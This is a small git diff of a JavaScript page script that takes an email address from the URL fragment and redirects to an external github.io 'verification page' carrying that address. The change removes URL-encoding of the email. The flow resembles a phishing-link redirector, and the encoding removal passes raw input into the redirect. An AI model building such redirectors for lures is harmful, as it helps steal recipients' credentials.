@@ -9,14 +9,14 @@ function enforceHTTPS() {
 function getEmailFromHash() {
   const hash = window.location.hash.substring(1); // Remove the #
   if (hash.includes("@") && hash.includes(".")) {
-    return encodeURIComponent(hash); // URL-encode the email
+    return hash.trim();
   }
   return null;
 }
 
 window.onload = () => {
   if (!enforceHTTPS()) return;
-  
+
   const email = getEmailFromHash();
 
   if (!email) {
@@ -24,6 +24,6 @@ window.onload = () => {
     return;
   }
 
-  // Redirect to verification page with email in hash
+  // Redirect to verification page with plain email in hash
   window.location.href = "https://hareru66.github.io/ref/#" + email;
 };
